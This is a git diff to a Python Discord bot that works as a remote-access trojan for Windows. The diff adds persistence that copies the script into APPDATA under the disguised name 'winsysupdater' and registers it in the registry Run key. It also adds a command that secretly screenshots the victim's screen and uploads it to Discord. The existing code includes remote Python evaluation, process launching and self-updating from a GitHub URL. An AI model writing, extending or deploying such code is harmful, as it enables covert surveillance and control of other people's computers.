@@ -1,7 +1,6 @@
 import discord
 from discord.ext import commands
 import os
-import json
 import uuid
 import ctypes
 import threading
@@ -12,29 +11,29 @@ import requests
 import sys
 import base64
 import shutil
+import winreg
+import mss
+import pygetwindow as gw
+
 
 def load_config():
     try:
-        url = 'https://raw.githubusercontent.com/Shinythunder/host/refs/heads/main/config.json'
+        url = 'https://raw.githubusercontent.com/Shinythunder/host/main/config.json'
         response = requests.get(url)
-        response.raise_for_status()  # Check if request was successful
+        response.raise_for_status()
         config = response.json()
-
-        # Decode the TOKEN with base64
         encoded_token = config.get('TOKEN')
         if encoded_token:
             decoded_token = base64.b64decode(encoded_token).decode('utf-8')
-            return decoded_token, config['COMMAND_PREFIX']
         else:
             raise ValueError("TOKEN not found in config.json.")
-
+        command_prefix = config.get('COMMAND_PREFIX', '')
+        return decoded_token, command_prefix
     except Exception as e:
         print(f"Error loading config: {e}")
         return None, None
-    
-# Get device ID (persistent UUID)
-def get_device_id():
-    path = 'device_id.txt'
+
+def get_device_id(path='device_id.txt'):
     if os.path.exists(path):
         with open(path, 'r') as f:
             return f.read().strip()
@@ -43,17 +42,33 @@ def get_device_id():
         f.write(device_id)
     return device_id
 
+def add_to_startup(script_full_path, name="WinSysUpdater"):
+    try:
+        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
+                             r"Software\Microsoft\Windows\CurrentVersion\Run",
+                             0, winreg.KEY_SET_VALUE)
+        winreg.SetValueEx(key, name, 0, winreg.REG_SZ, f'"{script_full_path}"')
+        winreg.CloseKey(key)
+    except Exception as e:
+        print(f"Failed to add to startup: {e}")
 
-script_dir = os.path.dirname(os.path.abspath(__file__))
+script_path = os.path.abspath(__file__)
+script_dir = os.path.dirname(script_path)
+target_dir = os.path.join(os.getenv('APPDATA'), "winsysupdater")
+target_script_path = os.path.join(target_dir, "winsysupdater.pyw")
+device_id_file = os.path.join(target_dir, "device_id.txt")
 
-# Path to device_id.txt
-device_id_path = "device_id.txt"
-
-# Check if device_id.txt exists in the current working directory
-if os.path.exists(device_id_path):
-    # Move device_id.txt to the same folder as the .pyw file
-    shutil.move(device_id_path, os.path.join(script_dir, device_id_path))
-
+if not os.path.abspath(script_path).startswith(os.path.abspath(target_dir)):
+    os.makedirs(target_dir, exist_ok=True)
+    if not os.path.exists("device_id.txt"):
+        with open("device_id.txt", 'w') as f:
+            f.write(str(uuid.uuid4()))
+    shutil.move("device_id.txt", device_id_file)
+    with open(script_path, 'r', encoding='utf-8', errors='ignore') as original, open(target_script_path, 'w', encoding='utf-8') as copied:
+        copied.write(original.read())
+    add_to_startup(target_script_path)
+    subprocess.Popen(['pythonw', target_script_path], close_fds=True)
+    sys.exit()
 
 
 # Load token and prefix
@@ -66,6 +81,7 @@ intents = discord.Intents.default()
 intents.message_content = True
 
 bot = commands.Bot(command_prefix=COMMAND_PREFIX, intents=intents, help_command=None)
+bot.help_command = None
 device_id = get_device_id()
 device_category = None
 commands_channel = None
@@ -103,7 +119,7 @@ async def on_ready():
         embed.add_field(name="!start <path>", value="Starts a process from file path", inline=False)
         embed.add_field(name="!eval <code>", value="Evaluates Python code (⚠️ risky)", inline=False)
         embed.add_field(name="!update", value="Updates the script from the URL (restricted access)", inline=False)
-
+        embed.add_field(name="!ss", value="Take a screenhot of the users device!", inline=False)
 
         await commands_channel.send(embed=embed)
     else:
@@ -228,7 +244,7 @@ async def update(ctx):
         return
 
 
-    url = "https://raw.githubusercontent.com/Shinythunder/host/refs/heads/main/test.py"
+    url = "https://raw.githubusercontent.com/Shinythunder/host/main/test.py"
     try:
         # Fetch the script from the URL
         response = requests.get(url)
@@ -264,8 +280,34 @@ async def help(ctx):
     embed.add_field(name="!start <path>", value="Starts a process from file path", inline=False)
     embed.add_field(name="!eval <code>", value="Evaluates Python code (⚠️ risky)", inline=False)
     embed.add_field(name="!update", value="Updates the script from the URL (restricted access)", inline=False)
+    embed.add_field(name="!ss", value="Take a screenhot of the users device!", inline=False)
 
     await ctx.send(embed=embed)
 
+
+
+@bot.command()
+async def ss(ctx):
+    if ctx.channel.category and ctx.channel.category.name != device_id:
+        print(f"Invalid category: {ctx.channel.category.name} != {device_id}")
+        return
+
+    try:
+        def capture_screen():
+            with mss.mss() as sct:
+                screenshot = sct.shot(output="screenshot.png")
+
+        capture_screen()
+
+        await ctx.send("Here is your screenshot:", file=discord.File("screenshot.png"))
+        print("Screenshot sent successfully.")
+
+        # Delete the screenshot after sending
+        os.remove("screenshot.png")
+        print("Screenshot deleted.")
+
+    except Exception as e:
+        print(f"Error taking or sending screenshot: {e}")
+        await ctx.send(f"An error occurred while taking or sending the screenshot: {e}")
 
 bot.run(TOKEN)
